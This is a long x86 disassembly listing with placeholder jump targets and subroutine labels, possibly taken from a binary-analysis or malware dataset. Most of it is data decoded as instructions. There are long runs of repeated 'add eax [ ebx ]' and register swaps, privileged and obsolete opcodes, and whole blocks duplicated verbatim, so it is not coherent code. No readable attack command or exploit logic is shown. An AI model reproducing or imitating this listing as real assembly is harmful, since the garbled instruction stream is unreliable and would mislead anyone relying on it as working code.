0x53a0
add eax [ ebx ]
add eax [ ebx ]
insb
out 0x77 al
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add edx ebx
jpe r-xdata
0x5aca
pop ebp
insb
insb
adc [ edi - 0x79 ] dl
sti
xchg edx eax
xchg ebx eax
xchg ebx eax
insb
les ebx [ ebx - 0x64481894 ]
insb
les edi [ edi + 0x46c93f9 ]
aas
xchg ebx eax
xchg ebx eax
xchg ebx eax
int3
inc ebp
insb
insb
sub_46717f
sbb [ ebp - 0xb ] dl
sbb cl dh
das
cmc
sbb al dh
push ebx
cmc
sbb ch dh
pop ecx
cmc
sbb bl dh
pop edi
jpo r-xdata
push ds
salc
dec edi
retn
jae r-xdata
xchg ebx eax
xchg ebx eax
mov al [ 0x40247a5a ]
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
insb
0x5316
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
lds ebx [ eax ]
bound edx [ esi ]
inc ebx
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add esi ebp
sbb cl dh
xchg ecx eax
enter 0x1af5 0xce
xchg edi eax
stc
movsd [ edi ] [ esi ]
enter 0x1af5 0xce
xchg ebp eax
stc
cmpsd [ esi ] [ edi ]
enter 0x1af5 0xce
fwait
sbb [ ebp - 0xb ] cl
sbb cl dh
cdq
jpe r-xdata
push ss
push ebx
jpe r-xdata
jpe r-xdata
ja r-xdata
pushfd
pop ss
jg r-xdata
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
mov al [ 0xffffffff9c53165a ]
or dl [ edx + 0x18 ]
push edx
pop edx
push eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax ebp
sbb [ edx + 0x16 ] ah
adc [ ebx + 0x3030393 ] 0x3
cmc
sub edx [ edx + 0x1a319c93 ]
inc ecx
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebp [ ebp + eax + 0x3f ]
xchg ebx eax
xchg ebx eax
xchg ebx eax
sbb [ 0xffffffff9393932f ] dl
insb
add eax esp
les edi [ edx + 0x76 ]
jne r-xdata
jpe r-xdata
lahf
xchg ebx eax
xchg ebx eax
sbb [ 0xffffffff9393932f ] dl
sbb [ 0xffffffff93939353 ] bl
cli
push ebx
pop ss
xchg ebx eax
xchg ebx eax
xchg ebx eax
sbb [ esi ] al
dec edi
outsb
insb
insb
sbb al [ edi ]
fwait
adc edx [ ebx + 0x15189393 ]
das
xchg ebx eax
xchg ebx eax
xchg ebx eax
push ds
push ds
imul ebp [ esi + 0x6c ] 0x6c
add eax [ ebx ]
add eax [ ebx ]
insb
add eax 0x9393933f
jl r-xdata
insb
add eax [ ebx ]
add edx [ edx ]
jg r-xdata
and edx [ ecx + 0x6c ]
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add edi [ edx + 0x5d ]
xchg edi eax
xchg ebx eax
xchg ebx eax
adc dh dh
ja r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebp [ esi + 0x77 ]
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
jpe r-xdata
add eax [ ebx ]
insb
inc eax
sbb [ ebp + 0x7a ] dl
pop esi
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
adc [ ebx + 0x6c ] ch
pushfd
push ss
insb
outsb
insb
insb
stc
xchg edx eax
push ds
xlat
mov bh 0xbc
jpe r-xdata
fidiv [ edi + 0x7a ]
cmc
shl ch 0x2b
xchg edx eax
xchg ebx eax
pushfd
xor [ edx ] ebx
add eax [ ebx ]
add esi ebp
sbb dl dh
dec ebx
jpe r-xdata
arpl [ esp + ebp * 2 + 0x3 ] bp
add eax [ ebx ]
add eax [ ebx ]
add ebx [ edx ]
salc
jpe r-xdata
jpo r-xdata
outsb
insb
insb
jae r-xdata
jpe r-xdata
js r-xdata
fisubr [ esp + 0x57 ]
xchg ebx eax
xchg ebx eax
xchg ebx eax
jpo r-xdata
insb
stc
test ecx 0x6c48837a
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
sbb [ ebx - 0x7 ] ch
test esp 0x9323056c
xchg ebx eax
xchg ebx eax
sar [ edx + 0x23 ] 0x51
insb
xchg ebx eax
jpo r-xdata
sbb [ ebx + edi * 2 + 0x69 ] dl
nop
xchg ebx eax
xchg ebx eax
0x53a0
add eax [ ebx ]
add eax [ ebx ]
insb
out 0x77 al
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add edx ebx
jpe r-xdata
0x5aca
pop ebp
insb
insb
adc [ edi - 0x79 ] dl
sti
xchg edx eax
xchg ebx eax
xchg ebx eax
insb
les ebx [ ebx - 0x64481894 ]
insb
les edi [ edi + 0x46c93f9 ]
aas
xchg ebx eax
xchg ebx eax
xchg ebx eax
int3
inc ebp
insb
insb
sub_467385
insb
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add edi ebx
imul ebx [ edi - 0x54 ] 0xffffffda
insb
and al 0x57
xchg ebx eax
xchg ebx eax
xchg ebx eax
jpo r-xdata
0x5aca
pop ebp
insb
insb
adc [ edi - 0x79 ] dl
sti
xchg edx eax
xchg ebx eax
xchg ebx eax
insb
les ebx [ ebx - 0x64481894 ]
insb
les edi [ edi + 0x46c93f9 ]
aas
xchg ebx eax
xchg ebx eax
xchg ebx eax
int3
sub_4673bc
push eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
pushfd
sbb ah [ 0x1093939c ]
pop ebx
insb
push eax
add eax [ ebx ]
add eax [ ebx ]
add ecx edx
0x505a
sub_4673f6
dec esp
insb
insb
arpl [ esi ] bx
salc
outsd
jpe r-xdata
dec esi
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add ebx [ esi ]
push ds
and ebp [ esi + 0x6c ]
insb
jpo r-xdata
push ss
push ebx
jpe r-xdata
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebp [ ebp + eax + 0x2b ]
xchg ebx eax
xchg ebx eax
xchg ebx eax
jne r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
insb
add eax 0x9393932b
adc [ ebx - 0x63ace96d ] 0x9387d716
xchg ebx eax
push ds
out dx al
sub ebx [ esi ]
push ds
and ebp [ esi + 0x6c ]
insb
jpo r-xdata
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add edx [ eax ]
push edi
lahf
push ss
push ebx
jpe r-xdata
insb
add eax [ ebx ]
add eax [ ebx ]
retn
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
push ds
salc
inc ebx
lds edi [ edx - 0xf ]
test [ ebx + 0x3030393 ] dl
add eax [ ebx ]
sub ecx [ esp + ebp * 2 + 0x6c ]
adc [ ebx - 0x78c8856d ] 0x3039393
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebx [ edi + edx - 0x6c6c6c7f ]
jpo r-xdata
cmpsd [ esi ] [ edi ]
insb
out 0x6b al
sbb dl dh
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add edi [ edx + 0x33 ]
dec ecx
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
retn
int3
jg r-xdata
inc ebx
push ds
salc
inc ebx
retn
insb
push ss
push ebx
pushfd
pop ss
xchg esi eax
xchg ebx eax
xchg ebx eax
xchg ebx eax
mov al [ 0xffffffff9b1af55a ]
push eax
add eax [ ebx ]
add eax [ ebx ]
sbb [ edi - 0x3e ] bh
adc dh dh
outsd
xchg ebx eax
lds ebx [ eax ]
sub_46755d
sbb [ edi + 0x10 ] bh
jg r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
insb
les ecx [ edi + 0x18bbdd18 ]
salc
imul edx [ eax + 0x1ac36fde ] 0x1b
and edx [ ebx - 0x19936c6d ]
jpo r-xdata
shl [ eax + 0x7ac4c553 ] 0xb1
inc esi
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ecx ebx
stc
cli
cmc
sbb dl dh
jge r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
retn
add al 0x17
xchg ebx eax
xchg ebx eax
xchg ebx eax
mov al [ 0x5c317a53 ]
insb
insb
fwait
cmc
push ss
pop edx
pushfd
push ss
adc al 0x70
insb
insb
mov al [ 0x3035053 ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
push ds
push ss
xor ebp [ esi + 0x6c ]
insb
retn
imul edx [ ebx + 0x6c ] 0x6c
add eax [ ebx ]
pushfd
pop ss
mov ebp 0xa06c6c73
push ebx
sar [ edx - 0x71 ] cl
adc [ ebx + 0x3030393 ] 0x3
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add edi [ ebx - 0x50 ]
cwde
xchg ebx eax
xchg ebx eax
adc [ edi - 0x61 ] dl
sti
xchg ebx eax
adc edx [ ebx + 0x583e7a93 ]
insb
insb
add eax [ ebx ]
add eax [ ebx ]
sub_4675ef
inc ebx
insb
insb
add eax [ ebx ]
add ebx [ esp + 0x5a16f59b ]
pushfd
push ss
adc al 0x70
insb
insb
mov al [ 0x3035053 ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
push ds
push ss
xor ebp [ esi + 0x6c ]
insb
retn
sub_467613
shr [ esp + eax * 8 - 0x21 ] 0x16
push ebx
pushfd
pop ss
adc dl [ ebp + 0x6c ]
insb
jpe r-xdata
xchg ecx eax
xchg ebx eax
xchg ebx eax
retn
pop ebp
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add edi ebx
xchg ebx eax
adc edx [ ebx + 0x4ae37a93 ]
insb
insb
add eax [ ebx ]
sbb bl ah
scasd [ edi ]
nop
arpl [ esp + 0x571087d5 ] bx
lahf
push ds
xlat
mov [ 0xffffffff919bfb8b ] eax
xchg ebx eax
xchg ebx eax
sbb dl dh
inc ebx
push ds
push ss
adc ebp [ esi + 0x6c ]
insb
rol bl 0x7b
stc
cdq
xchg ebx eax
xchg ebx eax
adc [ edi - 0x61 ] dl
jpe r-xdata
add eax [ ebx ]
add ebx [ esp + 0x5a16f59b ]
pushfd
push ss
adc al 0x70
insb
insb
mov al [ 0x3035053 ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
push ds
push ss
xor ebp [ esi + 0x6c ]
insb
retn
imul ebp [ esp + ebp * 2 + 0x3 ] 0x3
add ebx [ esi + edx - 0x6c6c6c75 ]
push ds
push ss
pop ebx
outsb
insb
insb
retn
sub_467741
out 0x7a eax
pop ecx
jb r-xdata
add eax [ ebx ]
pop edx
push eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
adc [ edx - 0x6f ] dl
insb
add eax [ ebx ]
add eax [ ebx ]
int3
add eax [ ebx ]
add eax esi
sbb [ edi + 0x12 ] bh
jg r-xdata
arpl [ esp + ebp * 2 + 0x3 ] bp
add eax [ ebx ]
add eax [ ebx ]
cmc
sbb cl dh
xor esi ebp
sbb al dh
aaa
jpo r-xdata
add eax [ ebx ]
add eax [ ebx ]
add ebx [ edx + 0x50 ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
xchg edi eax
xchg ebx eax
xchg ebx eax
jpe r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add edx [ eax ]
push edx
xchg ecx eax
pop ebx
insb
insb
jpe r-xdata
push ss
jg r-xdata
jb r-xdata
xchg ebx eax
insb
insb
stosd [ edi ]
into
sbb [ esi + edx + 0x6c6c6bf9 ] 0xffffffc3
rol al 0xf9
xchg esp eax
add esi ebp
sbb al dh
dec ebp
leave
stc
div ch
sbb al dh
jae r-xdata
insb
add eax [ ebx ]
add ecx esp
int 0x50
add eax [ ebx ]
add ebx [ esi ]
xlat
shr [ ebp + 0x7a ] cl
dec esi
push esi
insb
insb
add eax [ ebx ]

shr [ esp + eax + 0x73 ] 0x93
xchg ebx eax
xchg ebx eax
push ss
push ebx
pushfd
push ss
dec edi
insb
insb
stc
iretd
stc
imul ebp [ esp + ebp * 2 - 0x3d ] 0xffffffc0
sar cl 0x94
cmc
sbb al dh
jno r-xdata
salc
outsd
jpe r-xdata
inc ecx
stc
std
jpe r-xdata
cmpsb [ esi ] [ edi ]
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
push ds
push ds
push es
arpl [ eax + 0x6c ] bp
insb
jpo r-xdata
sub ebp [ esp + ebp * 2 - 0x64 ]
sub eax 0xa05c90a9
insb
insb
add eax ebx
sbb dh dl
fwait
stc
xchg ebx eax
sti
mov [ ebx - 0x19936c64 ] ss
lahf
jo r-xdata
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
mov al [ 0x417ad353 ]
inc edi
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
test al 0x4d
pushfd
pop ds
cld
dec ebx
insb
insb
mov al [ 0xffffffffc8cdcc53 ]
push eax
add eax [ ebx ]
sbb dh bl
outsd
adc [ edx - 0x79 ] dl
jpe r-xdata
cdq
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
0x16ca
insb
dec ebx
mov [ ebx + 0x7a ] dl
xchg edx eax
dec eax
insb
insb
cmc
sbb dl dh
inc edi

jpe r-xdata
xchg ebx eax
insb
out 0x9f al
dec ebp
insb
insb
add eax [ ebx ]
add ebx [ edi + edx + 0x6c6c4341 ]
les edi [ edx + 0x64 ]
js r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
insb
add eax [ ebx ]
add eax [ ebx ]
stc
xchg ebx eax
sti
xchg ebx eax
xchg ebx eax
adc [ ebx - 0x64046f07 ] 0xfffffffb
sbb dh [ eax - 0x6ca8db94 ]
xchg ecx eax
inc ebx
insb
js r-xdata
jpe r-xdata
pop ebx
insb
insb
adc [ edi - 0x75 ] dl
push ss
cmc
sbb ch dh
jg r-xdata
push 0x6c
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
retn
insb
add eax eax
insb
out 0x4f al
jpe r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
push ds
fimul [ edi + 0x7b ]
adc bl [ esi - 0x21856c6d ]
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add edx [ eax ]
push edx
xchg ecx eax
jpe r-xdata
cmc
sbb al dh
stosd [ edi ]
sbb [ ebp - 0xb ] ch
sbb ch dh
jge r-xdata
xchg ebx eax
xchg ebx eax
jpo r-xdata
push edi
xchg ebx eax
pop esp
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add ebx [ esi ]
salc
jg r-xdata
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
cmc
sbb ch dh
push ebx
sbb [ edx - 0xb ] ch
sbb ch dh
push ecx
sbb [ ebp - 0xb ] ch
sbb ch dh
push edi
stc
lds ebx [ eax ]
imul edi [ edx - 0x60 ] 0x5a
insb
insb
push ds
ficomp [ ebx + 0x1e ]
inc ebp
cmc
sbb al dh
test eax 0x1af56b18
out dx al
arpl [ eax ] bx
inc ebx
cmc
sbb al dh
scasd [ edi ]
sbb [ edx + 0x18 ] ch
inc edx
jpe r-xdata
push ebx
pushfd
pop ss
cdq
imul ebp [ esp + ebp * 2 - 0x7 ] 0x91f9c36c
mov edx [ esi ]
push ds
push ss
push edi
outsd
insb
insb
jpe r-xdata
salc
cmp edi [ ebx + 0x2 ]
xchg ebp eax
xchg ebx eax
xchg ebx eax
push ss
push ebx
jpe r-xdata
pop ebx
push ds
cwde
xchg ebx eax
xchg ebx eax
pushfd
pop ss
mov [ ebx + 0x6cc09393 ] edx
add eax 0x9393933f
sti
insb
xchg ebx eax
xchg ebx eax
xchg ebx eax
rol ch 0x7b
mov dl 0x95
xchg ebx eax
xchg ebx eax
adc [ edi - 0x61 ] dl
sbb ch bh
mov bh 0x87
lds edi [ ebx - 0x4f ]
insb
insb
0xd71a
push ecx
insb
add eax [ ebx ]
cmc
sbb al dh
movsd [ edi ] [ esi ]
stc
hlt
dec edi
insb
insb
add eax [ ebx ]
add eax [ ebx ]
sub_467793
mov al [ 0xffffffff80697a65 ]
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
pop edx
push eax
add eax [ ebx ]
add eax esi
sbb [ edi + 0x12 ] bh
jg r-xdata
arpl [ esp + ebp * 2 + 0x3 ] bp
add eax [ ebx ]
add eax [ ebx ]
cmc
sbb cl dh
xor esi ebp
sbb al dh
aaa
jpo r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
pop edx
push eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
adc [ edx - 0x6f ] dl
add eax [ ebx ]
add eax [ ebx ]
add ebx [ edx + 0x50 ]
xchg edi eax
xchg ebx eax
xchg ebx eax
jpe r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add edx [ eax ]
push edx
xchg ecx eax
pop ebx
insb
insb
jpe r-xdata
push ss
jg r-xdata
jb r-xdata
xchg ebx eax
insb
insb
stosd [ edi ]
into
sbb [ esi + edx + 0x6c6c6bf9 ] 0xffffffc3
rol al 0xf9
xchg esp eax
add esi ebp
sbb al dh
dec ebp
leave
stc
div ch
sbb al dh
jae r-xdata
insb
add eax [ ebx ]
add ecx esp
int 0x50
add eax [ ebx ]
add ebx [ esi ]
xlat
shr [ ebp + 0x7a ] cl
dec esi
push esi
insb
insb
add eax [ ebx ]

shr [ esp + eax + 0x73 ] 0x93
xchg ebx eax
xchg ebx eax
push ss
push ebx
pushfd
push ss
dec edi
insb
insb
stc
iretd
stc
imul ebp [ esp + ebp * 2 - 0x3d ] 0xffffffc0
sar cl 0x94
cmc
sbb al dh
jno r-xdata
salc
outsd
jpe r-xdata
inc ecx
stc
std
jpe r-xdata
cmpsb [ esi ] [ edi ]
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
push ds
push ds
push es
arpl [ eax + 0x6c ] bp
insb
jpo r-xdata
sub ebp [ esp + ebp * 2 - 0x64 ]
sub eax 0xa05c90a9
insb
insb
add eax ebx
sbb dh dl
fwait
stc
xchg ebx eax
sti
mov [ ebx - 0x19936c64 ] ss
lahf
jo r-xdata
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
mov al [ 0x417ad353 ]
inc edi
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
test al 0x4d
pushfd
pop ds
cld
dec ebx
insb
insb
mov al [ 0xffffffffc8cdcc53 ]
push eax
add eax [ ebx ]
sbb dh bl
outsd
adc [ edx - 0x79 ] dl
jpe r-xdata
cdq
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
0x16ca
insb
dec ebx
mov [ ebx + 0x7a ] dl
xchg edx eax
dec eax
insb
insb
cmc
sbb dl dh
inc edi

jpe r-xdata
xchg ebx eax
insb
out 0x9f al
dec ebp
insb
insb
add eax [ ebx ]
add ebx [ edi + edx + 0x6c6c4341 ]
les edi [ edx + 0x64 ]
js r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
insb
add eax [ ebx ]
add eax [ ebx ]
stc
xchg ebx eax
sti
xchg ebx eax
xchg ebx eax
adc [ ebx - 0x64046f07 ] 0xfffffffb
sbb dh [ eax - 0x6ca8db94 ]
xchg ecx eax
inc ebx
insb
js r-xdata
jpe r-xdata
pop ebx
insb
insb
adc [ edi - 0x75 ] dl
push ss
cmc
sbb ch dh
jg r-xdata
push 0x6c
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
retn
insb
add eax eax
insb
out 0x4f al
jpe r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
push ds
fimul [ edi + 0x7b ]
adc bl [ esi - 0x21856c6d ]
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add edx [ eax ]
push edx
xchg ecx eax
jpe r-xdata
cmc
sbb al dh
stosd [ edi ]
sbb [ ebp - 0xb ] ch
sbb ch dh
jge r-xdata
xchg ebx eax
xchg ebx eax
jpo r-xdata
push edi
xchg ebx eax
pop esp
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add ebx [ esi ]
salc
jg r-xdata
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
cmc
sbb ch dh
push ebx
sbb [ edx - 0xb ] ch
sbb ch dh
push ecx
sbb [ ebp - 0xb ] ch
sbb ch dh
push edi
stc
lds ebx [ eax ]
imul edi [ edx - 0x60 ] 0x5a
insb
insb
push ds
ficomp [ ebx + 0x1e ]
inc ebp
cmc
sbb al dh
test eax 0x1af56b18
out dx al
arpl [ eax ] bx
inc ebx
cmc
sbb al dh
scasd [ edi ]
sbb [ edx + 0x18 ] ch
inc edx
jpe r-xdata
push ebx
pushfd
pop ss
cdq
imul ebp [ esp + ebp * 2 - 0x7 ] 0x91f9c36c
mov edx [ esi ]
push ds
push ss
push edi
outsd
insb
insb
jpe r-xdata
salc
cmp edi [ ebx + 0x2 ]
xchg ebp eax
xchg ebx eax
xchg ebx eax
push ss
push ebx
jpe r-xdata
pop ebx
push ds
cwde
xchg ebx eax
xchg ebx eax
pushfd
pop ss
mov [ ebx + 0x6cc09393 ] edx
add eax 0x9393933f
sti
insb
xchg ebx eax
xchg ebx eax
xchg ebx eax
rol ch 0x7b
mov dl 0x95
xchg ebx eax
xchg ebx eax
adc [ edi - 0x61 ] dl
sbb ch bh
mov bh 0x87
lds edi [ ebx - 0x4f ]
insb
insb
0xd71a
push ecx
insb
add eax [ ebx ]
cmc
sbb al dh
movsd [ edi ] [ esi ]
stc
hlt
dec edi
insb
insb
add eax [ ebx ]
add eax [ ebx ]
sub_467800
cmc
sbb dl dh
imul esp [ eax - 0x29e50aad ] 0x64c47a6f
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
push ds
push ss
jg r-xdata
xchg ebx eax
insb
insb
stosd [ edi ]
into
sbb [ esi + edx + 0x6c6c6bf9 ] 0xffffffc3
rol al 0xf9
xchg esp eax
shr [ esp + eax + 0x73 ] 0x93
xchg ebx eax
xchg ebx eax
push ss
push ebx
pushfd
push ss
dec edi
insb
insb
stc
iretd
sub_467b29
add eax 0x5e697ac5
insb
insb
add eax [ ebx ]
insb
out 0x9f al
jpo r-xdata
add eax [ ebx ]
add eax [ ebx ]
add edi ebx
push 0x57106c6c
lahf
push ss
push ebx
pushfd
inc eax
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]

mov edi 0xa0939391
dec eax
lds edi [ edx + 0x1f ]
jae r-xdata
adc dl [ ecx + ebx * 2 - 0x6d ]
xchg ebx eax
xchg ebx eax
push ds
pop ss
mov bh 0xb
xchg ebx eax
xchg ebx eax
xchg ebx eax
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
sbb [ edi + 0x10 ] bh
jg r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ecx ebx
jpe r-xdata
sar [ edx - 0x40 ] 0x9c
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
pushfd
pop ss
push cs
dec eax
insb
insb
pop ss
lodsb [ esi ]
push edi
insb
insb
mov al [ 0xffffffffaa7ad353 ]
push edi
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebp [ 0xffffffff939391bf ]
mov al [ 0x1f7ac548 ]
xchg ebx eax
adc edx [ ebx + 0x6c93f993 ]
out 0xb7 eax
mov ebx 0x18e7c56c
xlat
mov bh 0x83
jpe r-xdata
pushfd
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
sti
sbb dh dl
outsd
sbb esi ebx
lahf
sbb ebx [ ebx + 0x7a6fd618 ]
push ss
xchg ecx eax
xchg ebx eax
xchg ebx eax
pushfd
and al 0xa1
jpe r-xdata
add eax [ ebx ]
add eax [ ebx ]
add ebx [ edi + edx + 0x6c6c480e ]
jge r-xdata
add eax [ ebx ]
add esi ebp
sbb cl dh
insd
sbb [ ecx - 0xb ] cl
sbb cl dh
insb
